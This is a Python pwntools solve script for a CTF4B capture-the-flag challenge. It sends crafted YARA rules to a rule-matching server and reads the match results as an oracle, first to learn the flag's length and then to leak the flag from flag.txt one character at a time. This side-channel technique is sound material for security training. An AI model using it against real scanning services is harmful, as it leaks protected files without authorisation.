#!/usr/bin/env python3
from pwn import *
import os
import string

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '5003'))

context.log_level = 'critical'

flag = 'ctf4b{'

length_rule = '''rule format {
    strings:
        $fmt = /ctf4b{.*}/
    condition:
        any of them
}'''

for i in range(100):
    fmt = 'ctf4b{' + '.' * i + '}'
    rule = f'''
rule length_{i} {{
    strings:
        ${i} = /{fmt}/
    condition:
        any of them
}}'''
    length_rule += rule


length_rule += '\n'

io = remote(HOST, PORT)

io.sendlineafter(b'rule:', length_rule.encode())

io.recvuntil(b'matched: [format, length_')

length = int(io.recv(2).decode())

io.close()

chars = string.ascii_letters + string.digits + '_'

rule = ''

for i in range(length):
    for c in chars:
        rule += f'''rule flag_{i}_{c} {{
    strings:
        $flag = /ctf4b{{{'.'*i+c}.*/
    condition:
        any of them
}}
'''

io = remote(HOST, PORT)
io.sendlineafter(b'rule:', rule.encode())
io.recvuntil(b'OK. Now I find the malware from this rule:')
result = ''.join(io.recvallS())
io.close()

leaked = map(lambda s: s[-1], result.splitlines()[-2].lstrip('Found: ./flag.txt, matched :').rstrip(']').lstrip('[').split(', '))

print(flag + ''.join(leaked) + '}')
